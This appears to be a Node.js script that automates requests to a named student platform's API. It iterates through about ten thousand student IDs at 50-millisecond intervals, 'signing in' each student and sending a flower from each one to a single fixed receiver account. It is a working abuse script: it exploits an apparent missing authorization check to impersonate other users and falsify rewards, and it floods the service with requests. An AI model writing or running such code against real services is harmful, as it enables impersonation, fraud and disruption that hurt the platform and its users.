const https = require('https');

const signUrl = id => `https://studentapi.lyced.com//student/Sign?StudentId=${id}`
const flowerUrl = id => `https://studentapi.lyced.com//student/SendFlower?Sender=${id}&Receiver=1194137&FlowerCount=1`

let id = 1000;

function send(i) {
    if (i > 11000) {
        throw new Error('sss')
    }
    https.get(signUrl(id), res => {
         let data = '';
        // called when a data chunk is received.
        res.on('data', (chunk) => {
           data += chunk;
        });
       // called when the complete response is received.
        res.on('end', () => {
            const v = JSON.parse(data)
            console.log('sign', id, v)
            https.get(flowerUrl(id), res => {
            let data = '';
                // called when a data chunk is received.
                res.on('data', (chunk) => {
                 data += chunk;
                });
             // called when the complete response is received.
              res.on('end', () => {
                    const v = JSON.parse(data)
                   console.log('flwr', id, v)
            });
    });
        });
    });
    
}

setInterval(() => send(id++), 50)
